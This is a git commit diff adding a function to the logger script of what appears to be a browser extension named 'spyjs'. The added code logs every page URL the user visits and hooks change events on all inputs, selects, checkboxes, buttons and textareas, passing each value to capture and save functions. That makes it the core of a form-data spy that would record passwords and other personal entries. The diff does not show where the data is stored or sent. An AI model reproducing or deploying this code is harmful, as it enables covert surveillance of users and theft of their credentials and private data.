28f2f1842ab1b137664e540900e08d01d7a50ff1
krishpranav <krisna.pranav@gmail.com>
2021-04-04 09:13:33 +0530

    done changes

--- extension/js/logger.js
+++ extension/js/logger.js
@@ -3,3 +3,37 @@ var debug = 1;
 var currLoc = "";
 spyjs_refreshEvents();
 
+function spyjs_refreshEvents(){
+	if(currLoc != location.href){
+		currLoc=location.href;
+		if(debug){
+			console.log(currLoc);
+		}
+		spyjs_saveData("("+currLoc+")");
+	}
+	$('input').unbind('change');
+	$('input').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+	
+	$('select').unbind('change');
+	$('select').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+	
+	$('checkbox').unbind('change');
+	$('checkbox').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+	
+	$('button').unbind('change');
+	$('button').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+	
+	
+	$('textarea').unbind('change');
+	$('textarea').change(function(e) {
+  		spyjs_getInput(e.currentTarget);
+	});
+}
